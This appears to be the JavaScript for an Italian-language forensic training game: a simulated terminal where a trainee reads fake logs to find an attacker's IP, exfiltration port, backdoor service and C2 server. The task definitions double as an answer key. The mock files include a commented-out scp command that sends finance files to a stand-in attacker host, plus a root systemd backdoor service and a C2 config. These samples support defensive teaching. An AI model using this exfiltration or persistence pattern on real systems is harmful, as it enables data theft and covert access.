let term;
let fitAddon;
const consoleContainer = document.getElementById("consoleContainer");
const closeConsoleBtn = document.getElementById("closeConsoleBtn");
const taskDisplayElement = document.getElementById("currentTaskText");

// Cronologia comandi
let commandHistory = [];
let historyIndex = -1;
let savedCommand = '';

// Autocompletamento
const availableCommands = ['help', 'ls', 'cd', 'cat', 'task', 'clear'];
let autoCompleteIndex = -1;
let autoCompleteMatches = [];
let autoCompletePartial = '';

// --- Task Definition ---
const TASKS = [
    {
        id: 1,
        description: "Benvenuto, Analista.\nTASK 1: Identifica l'indirizzo IP dell'attaccante esaminando il file 'suspicious.log' nella directory 'case_files'.\nDigita 'help' per i comandi.",
        targetFile: "~/case_files/suspicious.log",
        keywordToComplete: "10.10.10.155", 
        nextTaskId: 2,
        completionMessage: "TASK 1 COMPLETATO: IP dell'attaccante identificato (10.10.10.155)."
    },
    {
        id: 2,
        description: "TASK 2: Il log menziona uno script 'data_exfil.sh' eseguito dall'utente 'admin_compromised'. Trova questo script (dovrebbe essere in 'case_files') ed esamina il suo contenuto per identificare l'IP di destinazione dell'esfiltrazione.",
        targetFile: "~/case_files/data_exfil.sh",
        keywordToComplete: "1.2.3.4", 
        nextTaskId: 3,
        completionMessage: "TASK 2 COMPLETATO: IP di esfiltrazione identificato (1.2.3.4)."
    },
    {
        id: 3,
        description: "TASK 3: Ottimo. Ora analizza il file 'network_traffic.log' in 'case_files/evidence' per trovare la porta usata per l'esfiltrazione verso l'IP 1.2.3.4.",
        targetFile: "~/case_files/evidence/network_traffic.log",
        keywordToComplete: "PORT: 2222",
        nextTaskId: 4,
        completionMessage: "TASK 3 COMPLETATO: Porta di esfiltrazione identificata (2222)."
    },
    {
        id: 4,
        description: "TASK 4: Sembra che l'attaccante abbia lasciato una backdoor. Controlla la directory '/etc/systemd/system' alla ricerca di servizi sospetti. Cerca un file di servizio che non dovrebbe esserci e identifica il nome dell'eseguibile della backdoor.",
        targetFile: "~/etc/systemd/system/suspicious_service.service",
        keywordToComplete: "ExecStart=/usr/local/bin/bkdr_agent",
        nextTaskId: 5,
        completionMessage: "TASK 4 COMPLETATO: Eseguibile della backdoor identificato (/usr/local/bin/bkdr_agent)."
    },
    {
        id: 5,
        description: "TASK 5: Indagine quasi conclusa. L'eseguibile '/usr/local/bin/bkdr_agent' è la backdoor. Esamina il file 'bkdr_agent_config.xml' che si trova in '/etc/backdoor_configs/' per trovare l'URL del server Command & Control (C2).",
        targetFile: "~/etc/backdoor_configs/bkdr_agent_config.xml",
        keywordToComplete: "<server_url>http://malicious-c2.badguy.net/updates</server_url>",
        nextTaskId: 6,
        completionMessage: "TASK 5 COMPLETATO: Server C2 della backdoor identificato."
    },
    {
        id: 6,
        description: "TASK 6: Eccellente lavoro, Analista! Hai raccolto tutte le prove chiave: IP attaccante, IP e porta di esfiltrazione, eseguibile della backdoor e server C2. L'indagine è conclusa. Prepara il tuo report!",
        isFinal: true,
        completionMessage: "INDAGINE CONCLUSA CON SUCCESSO! Tutte le prove raccolte."
    }
];
let currentTask = TASKS[0];

// --- File System Definition ---
const fileSystem = {
    "~": {
        type: "directory",
        content: {
            "case_files": {
                type: "directory",
                content: {
                    "suspicious.log": { type: "file", content: "[2025-05-06 16:20:00] User 'admin_compromised' logged in from IP 10.10.10.155\n[2025-05-06 16:21:30] WARNING: Failed login attempt for user 'root' from 192.168.1.102\n[2025-05-06 16:22:05] User 'admin_compromised' executed 'data_exfil.sh' in /usr/local/bin. Script found copied to ~/case_files/data_exfil.sh for analysis." },
                    "report_template.docx": { type: "file", content: "Questo è un template di report." },
                    "data_exfil.sh": { type: "file", content: "#!/bin/bash\n# Simple exfiltration script\n# WARNING: This script is part of a forensic investigation\n\nTARGET_IP=\"1.2.3.4\"\nFILES_TO_STEAL=\"/company_data/finances/*\"\n\necho \"Starting exfiltration to $TARGET_IP...\"\n# scp -r $FILES_TO_STEAL attacker@$TARGET_IP:/backup/loot/\necho \"Exfiltration attempt logged.\""},
                    "evidence": {
                        type: "directory",
                        content: {
                            "network_traffic.log": { type: "file", content: "[2025-05-06 16:22:10] Connection established: SRC_IP=10.10.10.155 DST_IP=1.2.3.4 PROTO=TCP SPORT=49152 DPORT=2222\n[2025-05-06 16:22:15] Data transfer: 1.5MB sent to 1.2.3.4:2222\n[2025-05-06 16:22:20] Connection closed: 10.10.10.155 to 1.2.3.4 PORT: 2222" }
                        }
                    }
                }
            },
            "tools": {
                type: "directory",
                content: {
                    "analyzer.exe": { type: "file", content: "Binary executable for analysis (simulato)" }
                }
            },
            "readme.txt": { type: "file", content: "Benvenuto nel sistema di analisi forense simulato.\nUsa i comandi 'ls', 'cd', 'cat' per esplorare i file.\nCompleta i task assegnati." },
            "etc": {
                type: "directory",
                content: {
                    "systemd": {
                        type: "directory",
                        content: {
                            "system": {
                                type: "directory",
                                content: {
                                    "network.service": {type: "file", content: "[Unit]\nDescription=Network Service\n\n[Service]\nExecStart=/usr/sbin/network_daemon\n\n[Install]\nWantedBy=multi-user.target"},
                                    "suspicious_service.service": {type: "file", content: "[Unit]\nDescription=System Update Utility (Definitely not malware)\n\n[Service]\nUser=root\nExecStart=/usr/local/bin/bkdr_agent -c /etc/backdoor_configs/bkdr_agent_config.xml\nRestart=always\n\n[Install]\nWantedBy=multi-user.target"},
                                    "cron.service": {type: "file", content: "Description=Cron Service"}
                                }
                            }
                        }
                    },
                    "backdoor_configs": {
                        type: "directory",
                        content: {
                            "bkdr_agent_config.xml": {type: "file", content: "<?xml version=\"1.0\"?>\n<config>\n  <settings>\n    <auto_start>true</auto_start>\n    <log_level>debug</log_level>\n  </settings>\n  <connection>\n    <server_url>http://malicious-c2.badguy.net/updates</server_url>\n    <retry_interval_seconds>300</retry_interval_seconds>\n  </connection>\n</config>"}
                        }
                    }
                }
            }
        }
    }
};

let currentPath = "~";

function updateTaskDisplay() {
    if (taskDisplayElement && currentTask) {
        taskDisplayElement.innerText = currentTask.description;
        document.getElementById("taskDisplayContainer").style.display = "block";
    }
}

function getCurrentDirectoryObject() {
    let pathParts = [];
    if (currentPath === "~") return fileSystem["~"];
    if (currentPath.startsWith("~/")) pathParts = currentPath.substring(2).split("/").filter(p => p);
    else if (currentPath.startsWith("/")) pathParts = currentPath.substring(1).split("/").filter(p => p);
    else return null; // Percorso non valido se non inizia con ~ o /

    let currentLevel = fileSystem["~"]; // Inizia sempre dalla radice simulata
    if (currentPath.startsWith("/")) { // Se è un percorso assoluto, cerca dalla radice del FS simulato
        const rootDir = pathParts.shift(); // es. 'etc'
        if (fileSystem["~"] && fileSystem["~"].content[rootDir]) {
            currentLevel = fileSystem["~"].content[rootDir];
        } else {
            return null;
        }
    }
    
    for (const part of pathParts) {
        if (part && currentLevel && currentLevel.type === "directory" && currentLevel.content && currentLevel.content[part]) {
            currentLevel = currentLevel.content[part];
        } else {
            return null;
        }
    }
    return currentLevel;
}

function initConsole() {
    // Configurazione avanzata di xterm.js
    term = new Terminal({
        cursorBlink: true,
        fontFamily: "'Courier New', Courier, monospace",
        fontSize: 14,
        theme: { background: '#1e1e1e', foreground: '#dcdcdc', cursor: '#dcdcdc' },
        allowTransparency: true,
        scrollback: 1000,
        convertEol: true,
        // Abilita copia/incolla
        copyOnSelect: true,
        rightClickSelectsWord: true
    });
    
    // Carica l'addon Fit
    fitAddon = new FitAddon.FitAddon();
    term.loadAddon(fitAddon);
    
    term.open(document.getElementById('terminal'));
    fitAddon.fit();

    updateTaskDisplay();
    term.writeln("Console Forense Simulata Inizializzata.");
    term.writeln("Visualizza l'obiettivo corrente nel pannello 'Obiettivo Corrente' qui sopra.");
    term.writeln("Digita 'help' per i comandi.");
    term.writeln("Usa frecce Su/Giù per navigare la cronologia, Tab per autocompletamento.");
    term.writeln("Seleziona testo per copiare, Ctrl+V per incollare.");
    term.writeln("");
    prompt();

    // Gestione avanzata degli eventi da tastiera
    term.onKey(e => {
        const ev = e.domEvent;
        const printable = !ev.altKey && !ev.ctrlKey && !ev.metaKey;
        
        // Gestione tasti speciali
        switch (ev.keyCode) {
            case 13: // Enter
                if (currentCommand.trim().length > 0) {
                    term.writeln('');
                    processCommand(currentCommand.trim());
                    // Aggiungi alla cronologia solo se non è vuoto e diverso dall'ultimo comando
                    if (commandHistory.length === 0 || commandHistory[commandHistory.length - 1] !== currentCommand.trim()) {
                        commandHistory.push(currentCommand.trim());
                    }
                    historyIndex = commandHistory.length;
                }
                prompt();
                currentCommand = '';
                autoCompleteIndex = -1;
                autoCompleteMatches = [];
                break;
                
            case 8: // Backspace
                if (currentCommand.length > 0) {
                    term.write('\b \b');
                    currentCommand = currentCommand.slice(0, -1);
                }
                break;
                
            case 38: // Freccia Su (cronologia precedente)
                if (historyIndex > 0) {
                    historyIndex--;
                    // Salva il comando corrente se è la prima volta che si preme freccia su
                    if (historyIndex === commandHistory.length - 1 && savedCommand === '') {
                        savedCommand = currentCommand;
                    }
                    // Cancella la riga corrente
                    while (currentCommand.length > 0) {
                        term.write('\b \b');
                        currentCommand = currentCommand.slice(0, -1);
                    }
                    // Scrivi il comando dalla cronologia
                    currentCommand = commandHistory[historyIndex];
                    term.write(currentCommand);
                }
                break;
                
            case 40: // Freccia Giù (cronologia successiva)
                if (historyIndex < commandHistory.length) {
                    historyIndex++;
                    // Cancella la riga corrente
                    while (currentCommand.length > 0) {
                        term.write('\b \b');
                        currentCommand = currentCommand.slice(0, -1);
                    }
                    // Scrivi il comando dalla cronologia o il comando salvato
                    if (historyIndex === commandHistory.length) {
                        currentCommand = savedCommand;
                        savedCommand = '';
                    } else {
                        currentCommand = commandHistory[historyIndex];
                    }
                    term.write(currentCommand);
                }
                break;
                
            case 9: // Tab (autocompletamento)
                ev.preventDefault(); // Previene il comportamento predefinito del tab
                handleTabCompletion();
                break;
                
            default:
                if (printable && ev.key.length === 1) {
                    currentCommand += ev.key;
                    term.write(ev.key);
                }
        }
    });
    
    // Gestione incolla
    term.element.addEventListener('paste', (event) => {
        const text = event.clipboardData.getData('text');
        if (text) {
            // Aggiungi il testo incollato al comando corrente
            currentCommand += text;
            term.write(text);
        }
    });
    
    closeConsoleBtn.addEventListener("click", toggleConsoleVisibility);
    
    // Ridimensiona il terminale quando la finestra cambia dimensione
    window.addEventListener('resize', () => {
        fitAddon.fit();
    });
}

let currentCommand = '';

function prompt() {
    term.write(`\r\nanalyst@forensic-station:${currentPath}$ `);
}

// Funzione per gestire l'autocompletamento con Tab
function handleTabCompletion() {
    // Se è la prima volta che si preme Tab, trova i possibili completamenti
    if (autoCompleteIndex === -1) {
        const parts = currentCommand.split(' ');
        const lastPart = parts[parts.length - 1];
        autoCompletePartial = lastPart;
        
        // Se è il primo termine, completa i comandi
        if (parts.length === 1) {
            autoCompleteMatches = availableCommands.filter(cmd => cmd.startsWith(lastPart));
        } 
        // Se è un percorso, completa file e directory
        else if (parts[0] === 'cd' || parts[0] === 'ls' || parts[0] === 'cat') {
            autoCompleteMatches = getPathCompletions(lastPart);
        }
        
        if (autoCompleteMatches.length === 0) return; // Nessun completamento trovato
        autoCompleteIndex = 0;
    } else {
        // Cicla tra i possibili completamenti
        autoCompleteIndex = (autoCompleteIndex + 1) % autoCompleteMatches.length;
    }
    
    // Applica il completamento
    const completion = autoCompleteMatches[autoCompleteIndex];
    if (completion) {
        // Cancella la parte parziale
        for (let i = 0; i < autoCompletePartial.length; i++) {
            term.write('\b \b');
        }
        
        // Determina se è un comando o un percorso
        const parts = currentCommand.split(' ');
        if (parts.length === 1) {
            // È un comando
            currentCommand = completion;
            term.write(completion);
        } else {
            // È un percorso
            parts.pop(); // Rimuovi l'ultima parte
            parts.push(completion); // Aggiungi il completamento
            currentCommand = parts.join(' ');
            term.write(completion);
        }
    }
}

// Funzione per ottenere i possibili completamenti di percorso
function getPathCompletions(partial) {
    const completions = [];
    let basePath = '';
    let searchTerm = '';
    
    // Determina il percorso base e il termine di ricerca
    if (partial.includes('/')) {
        const lastSlashIndex = partial.lastIndexOf('/');
        basePath = partial.substring(0, lastSlashIndex + 1);
        searchTerm = partial.substring(lastSlashIndex + 1);
    } else {
        basePath = currentPath === '~' ? '~/' : currentPath + '/';
        searchTerm = partial;
    }
    
    // Ottieni l'oggetto directory per il percorso base
    let dirObject;
    if (basePath === '~/') {
        dirObject = fileSystem['~'];
    } else if (basePath.startsWith('~/')) {
        const pathParts = basePath.substring(2).split('/').filter(p => p);
        dirObject = fileSystem['~'];
        for (const part of pathParts) {
            if (dirObject && dirObject.type === 'directory' && dirObject.content && dirObject.content[part]) {
                dirObject = dirObject.content[part];
            } else {
                dirObject = null;
                break;
            }
        }
    } else if (basePath.startsWith('/')) {
        // Gestione percorsi assoluti
        const pathParts = basePath.substring(1).split('/').filter(p => p);
        if (pathParts.length > 0) {
            const rootDir = pathParts.shift();
            if (fileSystem['~'].content[rootDir]) {
                dirObject = fileSystem['~'].content[rootDir];
                for (const part of pathParts) {
                    if (dirObject && dirObject.type === 'directory' && dirObject.content && dirObject.content[part]) {
                        dirObject = dirObject.content[part];
                    } else {
                        dirObject = null;
                        break;
                    }
                }
            }
        }
    } else {
        // Percorso relativo
        dirObject = getCurrentDirectoryObject();
    }
    
    // Se abbiamo trovato la directory, cerca i possibili completamenti
    if (dirObject && dirObject.type === 'directory') {
        for (const item in dirObject.content) {
            if (item.startsWith(searchTerm)) {
                const isDir = dirObject.content[item].type === 'directory';
                completions.push(item + (isDir ? '/' : ''));
            }
        }
    }
    
    return completions;
}

function checkTaskCompletion(commandOutput) {
    if (!currentTask || currentTask.isFinal || !currentTask.keywordToComplete) return;

    if (commandOutput && commandOutput.includes(currentTask.keywordToComplete)) {
        term.writeln(`\r\n\x1b[32m${currentTask.completionMessage}\x1b[0m`);
        if (currentTask.nextTaskId) {
            const nextTask = TASKS.find(t => t.id === currentTask.nextTaskId);
            if (nextTask) {
                currentTask = nextTask;
                updateTaskDisplay();
                term.writeln(`\r\nNuovo obiettivo: ${currentTask.description.split('\n')[0]}`);
            } else {
                currentTask = { description: "Tutti i task principali completati!", isFinal: true };
                updateTaskDisplay();
            }
        } else {
            currentTask = { description: "Tutti i task completati!", isFinal: true };
            updateTaskDisplay();
        }
    }
}

function processCommand(command) {
    const parts = command.split(' ').filter(p => p.length > 0);
    const cmd = parts[0] ? parts[0].toLowerCase() : '';
    const arg = parts.slice(1).join(' '); // Gestisce argomenti con spazi, es. percorsi
    let commandOutputForTaskCheck = "";

    switch (cmd) {
        case 'help':
            term.writeln("Comandi disponibili (simulati):");
            term.writeln("  help          - Mostra questo aiuto.");
            term.writeln("  ls [percorso] - Lista file e directory (es. ls /etc).");
            term.writeln("  cd [dir]      - Cambia directory (es. cd case_files, cd .., cd /etc/systemd).");
            term.writeln("  cat [file]    - Mostra contenuto del file (es. cat suspicious.log).");
            term.writeln("  task          - Mostra di nuovo l'obiettivo corrente.");
            term.writeln("  clear         - Pulisce la console.");
            term.writeln("\nFunzionalità avanzate:");
            term.writeln("  - Usa frecce Su/Giù per navigare la cronologia dei comandi");
            term.writeln("  - Usa Tab per autocompletare comandi e percorsi");
            term.writeln("  - Seleziona testo per copiare, Ctrl+V per incollare");
            break;
        case 'ls':
            let pathToLs = arg ? arg : currentPath;
            if (arg && !arg.startsWith("/") && !arg.startsWith("~")) {
                 pathToLs = currentPath === "~" ? "~/" + arg : currentPath + "/" + arg;
            }
            const dirObjectForLs = getDirectoryObjectFromPath(pathToLs);
            if (dirObjectForLs && dirObjectForLs.type === "directory") {
                if (Object.keys(dirObjectForLs.content).length === 0) term.writeln("(Nessun file o directory)");
                else Object.keys(dirObjectForLs.content).forEach(item => term.writeln(item + (dirObjectForLs.content[item].type === "directory" ? "/" : "")));
            } else term.writeln(`ls: impossibile accedere a '${pathToLs}': Non è una directory valida o non esiste.`);
            break;
        case 'cd':
            if (!arg) { term.writeln("cd: specificare una directory."); break; }
            let newPath;
            if (arg === "~") newPath = "~";
            else if (arg.startsWith("/")) newPath = arg; // Percorso assoluto
            else if (arg.startsWith("~/")) newPath = arg; // Percorso assoluto da home
            else if (arg === "..") {
                if (currentPath === "~") newPath = "~";
                else {
                    let pathParts = (currentPath.startsWith("~/") ? currentPath.substring(2) : currentPath.substring(1)).split("/").filter(p => p);
                    pathParts.pop();
                    if (currentPath.startsWith("~/") || pathParts.length === 0) newPath = pathParts.length > 0 ? "~/" + pathParts.join("/") : "~";
                    else newPath = "/" + pathParts.join("/");
                    if (newPath === "/") newPath = "~"; // Evita di andare a una vera radice non gestita
                }
            } else {
                newPath = currentPath === "~" ? "~/" + arg : currentPath + "/" + arg;
            }
            const dirObjectForCd = getDirectoryObjectFromPath(newPath);
            if (dirObjectForCd && dirObjectForCd.type === "directory") {
                currentPath = newPath;
                 // Semplifica i percorsi doppi, es. ~/case_files/../case_files -> ~/case_files
                if (currentPath.includes("..")) {
                    const parts = currentPath.split('/');
                    const newParts = [];
                    for (const part of parts) {
                        if (part === "..") newParts.pop();
                        else newParts.push(part);
                    }
                    currentPath = newParts.join('/');
                }
                if (currentPath.endsWith("/") && currentPath !== "~/") currentPath = currentPath.slice(0, -1);
                if (currentPath === "") currentPath = "~"; // Fallback se il path diventa vuoto

            } else term.writeln(`cd: ${arg}: Non è una directory o non esiste.`);
            break;
        case 'cat':
            if (!arg) { term.writeln("cat: specificare un nome file."); break; }
            let pathToFileCat = arg;
            if (!arg.startsWith("/") && !arg.startsWith("~")) {
                 pathToFileCat = currentPath === "~" ? "~/" + arg : currentPath + "/" + arg;
            }
            const fileObjectForCat = getObjectFromPath(pathToFileCat);
            if (fileObjectForCat && fileObjectForCat.type === "file") {
                commandOutputForTaskCheck = fileObjectForCat.content;
                term.writeln(commandOutputForTaskCheck.replace(/\n/g, "\r\n"));
            } else term.writeln(`cat: ${arg}: File non trovato o non è un file.`);
            break;
        case 'task':
             if (currentTask) term.writeln(`\r\nObiettivo: ${currentTask.description.replace(/\n/g, "\r\n")}`);
             else term.writeln("Nessun task attivo al momento.");
            break;
        case 'clear':
            term.clear();
            break;
        default:
            if (cmd) term.writeln(`${cmd}: comando non trovato.`);
            break;
    }
    if (commandOutputForTaskCheck) checkTaskCompletion(commandOutputForTaskCheck);
}

// Funzione helper per ottenere un oggetto (file o dir) da un percorso completo
function getObjectFromPath(fullPath) {
    let pathParts;
    let currentLevel = fileSystem["~"];

    if (fullPath === "~") return fileSystem["~"];
    if (fullPath.startsWith("~/")) pathParts = fullPath.substring(2).split("/").filter(p => p);
    else if (fullPath.startsWith("/")) {
        pathParts = fullPath.substring(1).split("/").filter(p => p);
        const rootDir = pathParts.shift(); 
        if (fileSystem["~"] && fileSystem["~"].content[rootDir]) {
            currentLevel = fileSystem["~"].content[rootDir];
        } else {
            return null;
        }
    } else return null; // Percorso non valido

    for (let i = 0; i < pathParts.length; i++) {
        const part = pathParts[i];
        if (part && currentLevel && currentLevel.type === "directory" && currentLevel.content && currentLevel.content[part]) {
            currentLevel = currentLevel.content[part];
        } else {
            return null;
        }
    }
    return currentLevel;
}

// Funzione helper per ottenere specificamente un oggetto directory
function getDirectoryObjectFromPath(fullPath) {
    const obj = getObjectFromPath(fullPath);
    return (obj && obj.type === "directory") ? obj : null;
}

let consoleOpenedOnce = false;
function toggleConsoleVisibility() {
    const consoleContainer = document.getElementById("consoleContainer");
    const shortcutHint = document.getElementById("shortcutHint");
    
    if (consoleContainer.style.display === "none") {
        consoleContainer.style.display = "flex";
        
        // Se è la prima volta che apriamo la console, nascondi l'hint
        if (!consoleOpenedOnce) {
            consoleOpenedOnce = true;
            
            // Aggiungi una classe per l'animazione di fade-out
            shortcutHint.classList.add('fade-out-hint');
            
            // Rimuovi l'elemento dopo l'animazione
            setTimeout(() => {
                shortcutHint.style.display = "none";
            }, 500);
        }
    } else {
        consoleContainer.style.display = "none";
    }
}
